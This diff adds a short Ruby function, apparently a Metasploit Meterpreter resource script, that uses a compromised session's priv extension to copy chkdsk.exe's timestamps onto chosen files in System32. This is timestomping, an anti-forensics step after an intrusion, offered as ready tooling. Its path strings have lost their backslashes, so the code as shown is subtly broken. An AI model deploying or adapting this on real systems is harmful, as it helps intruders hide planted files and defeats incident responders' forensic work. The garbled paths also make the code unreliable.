@@ -1,0 +1,23 @@
+<ruby>
+
+# The files have to be in %WinDir%System32 folder.
+def chmace(session,cmds)
+    windir = ''
+    windrtmp = ""
+    print_status("Changing Access Time, Modified Time and Created Time of Files Used")
+    windir = session.fs.file.expand_path("%WinDir%")
+    cmds.each do |c|
+        begin
+            session.core.use("priv")
+            filetostomp = windir + "system32"+ c
+            fl2clone = windir + "system32chkdsk.exe"
+            print_status("tChanging file MACE attributes on #{filetostomp}")
+            session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
+
+        rescue ::Exception => e
+            print_status("Error changing MACE: #{e.class} #{e}")
+        end
+    end
+end
+
+</ruby>
